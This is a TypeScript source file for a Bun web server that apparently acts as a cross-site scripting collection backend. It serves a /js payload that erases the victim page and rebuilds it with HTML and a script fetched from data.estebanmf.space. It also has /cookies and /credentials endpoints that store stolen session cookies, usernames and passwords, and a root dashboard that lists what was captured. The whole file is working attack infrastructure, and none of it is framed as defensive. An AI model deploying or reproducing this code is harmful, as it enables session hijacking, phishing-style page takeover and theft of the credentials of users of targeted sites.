import { serve } from "bun";
import { initDB, addCookie, listCookies, addCredential, listCredentials } from "./db";
import { renderPage } from "./html";
import fs from "fs";

await initDB();

serve({
  port: 3000,
  async fetch(req) {
    const url = new URL(req.url);
    const origin = req.headers.get("Origin") || "*"; // Get the requesting origin

    // Serve xss.html for a specific endpoint (e.g., /xss)
    if (url.pathname === "/xss" && req.method === "GET") {
      const xssHtml = fs.readFileSync("xss.html", "utf-8");
      return new Response(xssHtml, {
        headers: {
          "Content-Type": "text/html",
          "Access-Control-Allow-Origin": origin, // Allow the requesting origin
        },
      });
    }

    if (url.pathname === "/xss-script.js" && req.method === "GET") {
      const jsCode = fs.readFileSync("xss-script.js", "utf-8");
      return new Response(jsCode, {
        headers: {
          "Content-Type": "application/javascript",
          "Access-Control-Allow-Origin": origin,
        },
      });
    }

    if (url.pathname === "/js" && req.method === "GET") {
      const jsCode = `
console.log('Evaluating JS string');
fetch('https://data.estebanmf.space/xss')
.then(t => t.text())
.then(d => {
console.log('Fetched HTML:', d);
// Clear existing document
while (document.documentElement.firstChild) {
document.documentElement.removeChild(document.documentElement.firstChild);
}
// Create <html> structure
const html = document.createElement('html');
const head = document.createElement('head');
const title = document.createElement('title');
title.textContent = 'XSS';
head.appendChild(title);
// Parse fetched body content into a temporary container
const tempDiv = document.createElement('div');
tempDiv.innerHTML = d; // Temporary use of innerHTML to parse
const body = tempDiv.querySelector('body') || document.createElement('body');
// Move body children to new body element
while (tempDiv.firstChild) {
body.appendChild(tempDiv.firstChild);
}
// Create script tag for xss-script.js
const script = document.createElement('script');
script.src = 'https://data.estebanmf.space/xss-script.js';
body.appendChild(script);
// Assemble document
html.appendChild(head);
html.appendChild(body);
document.appendChild(html);
console.log('DOM manually constructed and script appended');
})
.catch(e => console.error('Fetch error:', e));
`;
      return new Response(jsCode, {
        headers: {
          "Content-Type": "application/javascript",
          "Access-Control-Allow-Origin": origin,
        },
      });
    }

    // POST /cookies
    if (url.pathname === "/cookies" && req.method === "POST") {
      const body = (await req.json().catch(() => null)) as { cookies?: string } | null;
      if (body?.cookies) {
        await addCookie(body.cookies);
        return new Response("Cookies received!", {
          status: 200,
          headers: { "Access-Control-Allow-Origin": origin },
        });
      }
      return new Response("Missing cookies", { status: 400 });
    }

    // POST /credentials
    if (url.pathname === "/credentials" && req.method === "POST") {
      const body = (await req.json().catch(() => null)) as { username?: string; password?: string } | null;
      if (body?.username && body?.password) {
        await addCredential(body.username, body.password);
        return new Response("Credentials received!", {
          status: 200,
          headers: { "Access-Control-Allow-Origin": origin },
        });
      }
      return new Response("Missing username or password", { status: 400 });
    }

    // GET /
    if (url.pathname === "/") {
      const cookies = await listCookies();
      const creds = await listCredentials();
      return new Response(renderPage(cookies, creds), {
        headers: { "Content-Type": "text/html" },
      });
    }

    return new Response("Not found", { status: 404 });
  },
});

console.log("🚀 Server running at http://localhost:3000/");
